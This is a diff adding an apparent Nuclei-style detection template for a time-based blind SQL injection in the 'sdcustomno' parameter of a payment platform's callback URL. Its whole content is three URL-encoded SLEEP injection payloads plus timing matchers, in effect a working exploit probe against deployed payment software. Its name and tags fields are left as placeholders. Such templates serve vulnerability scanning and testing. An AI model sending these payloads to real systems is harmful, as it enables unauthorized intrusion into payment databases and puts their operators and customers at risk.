@@ -1,0 +1,25 @@
+id: jhzf-callbackurl-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 聚合支付平台接口sdcustomno存在SQL注入漏洞
+  reference:
+    - https://github.com/wy876/POC/commit/0add3e2624917470e0be3f4ee666cc69df5319b9#diff-845182d30db719124de27888b006e7398a7c97b86814a55cd1c8ab9d1dcd3079R14
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/pay_UPALIWAP_callbackurl?sdcustomno=*%27)%20AND%20(SELECT%202655%20FROM%20(SELECT(SLEEP(3)))DNPm)%20AND%20(%27RWpf%27=%27RWpf"
+      - "{{BaseURL}}/pay_UPALIWAP_callbackurl?sdcustomno=*%27)%20AND%20(SELECT%202655%20FROM%20(SELECT(SLEEP(6)))DNPm)%20AND%20(%27RWpf%27=%27RWpf"
+      - "{{BaseURL}}/pay_UPALIWAP_callbackurl?sdcustomno=*%27)%20AND%20(SELECT%202655%20FROM%20(SELECT(SLEEP(9)))DNPm)%20AND%20(%27RWpf%27=%27RWpf"
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
